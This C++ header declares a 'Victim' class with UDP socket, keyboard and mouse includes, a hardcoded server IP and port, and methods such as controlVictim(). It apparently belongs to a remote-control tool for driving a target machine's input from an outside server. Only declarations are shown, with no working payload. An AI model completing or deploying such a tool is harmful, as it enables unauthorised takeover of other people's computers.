#pragma once
#include <SFML/Network.hpp>
#include "Mlib/Util/util.hpp"
#include "Mlib/Io/keyboard.hpp"
#include "Mlib/Io/mouse.hpp"

#define SERVER_IP "2.235.241.210"
#define SERVER_PORT 2390

class Victim
{
public:
	Victim(sf::UdpSocket* s);
	void repeatKeys();
	int controlVictim();

private:
	sf::UdpSocket* socket;
	bool keysStates[256];
	size_t keysTimes[256];
	bool isRepeating[256];
};